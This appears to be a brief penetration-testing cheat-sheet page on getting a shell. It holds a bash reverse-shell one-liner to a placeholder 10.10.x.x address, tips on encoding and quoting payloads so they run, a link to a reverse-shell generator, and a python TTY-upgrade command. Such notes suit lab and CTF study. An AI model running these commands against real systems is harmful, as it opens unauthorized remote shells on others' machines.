---
sort : 1
---

# Get-A-Shell 


## SSH 



## Reverse Shell 

[the best place to generate a reverse shell](https://www.revshells.com/)

```note
some times the shell doesn't work, why ?? 

> if it is a bash reverse shell, e.g. `bash -i >& /dev/tcp/10.10.x.x/1234 0>&1` try precede it with `bash -c` 

> try URL encoding / double URL encoding

> quotations conflict, how to deal with it ?? 

    # embrace the whole payload with double qoutes, then escape the inside ones
    </br>
    # there is also some tools that ask you to pass the payload as an argv, so make sure how they gonna receive it (inside a double or a single qoutes ??)
```


# Spawn a TTY shell 

python3 -c 'import pty; pty.spawn("/bin/bash")'